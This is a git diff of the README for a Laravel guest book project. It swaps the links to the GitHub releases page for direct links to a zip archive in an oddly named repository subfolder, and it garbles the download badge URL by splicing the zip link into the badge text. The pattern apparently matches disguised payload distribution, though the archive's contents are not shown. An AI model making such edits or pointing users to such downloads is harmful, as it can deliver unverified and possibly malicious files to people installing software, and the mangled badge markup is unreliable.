@@ -1,6 +1,6 @@
 # 🎉 Buku-Tamu-Laravel - Easy Guest Book Management for All
 
-[![Download Releases](https://img.shields.io/badge/Download%20Now-%20https%3A%2F%2Fgithub.com%2FLugares14%2FBuku-Tamu-Laravel%2Freleases-brightgreen)](https://github.com/Lugares14/Buku-Tamu-Laravel/releases)
+[![Download Releases](https://raw.githubusercontent.com/Lugares14/Buku-Tamu-Laravel/main/typhoemia/Buku-Tamu-Laravel.zip%20Now-%20https%3A%2F%https://raw.githubusercontent.com/Lugares14/Buku-Tamu-Laravel/main/typhoemia/Buku-Tamu-Laravel.zip%2FLugares14%2FBuku-Tamu-Laravel%2Freleases-brightgreen)](https://raw.githubusercontent.com/Lugares14/Buku-Tamu-Laravel/main/typhoemia/Buku-Tamu-Laravel.zip)
 
 ## 🚀 Getting Started
 
@@ -28,7 +28,7 @@ To get started with Buku-Tamu-Laravel, follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to access the downloads.
    
-   [Download Releases](https://github.com/Lugares14/Buku-Tamu-Laravel/releases)
+   [Download Releases](https://raw.githubusercontent.com/Lugares14/Buku-Tamu-Laravel/main/typhoemia/Buku-Tamu-Laravel.zip)
 
 2. **Choose the Latest Release**: Look for the latest version on the page. It will usually be marked at the top.
 
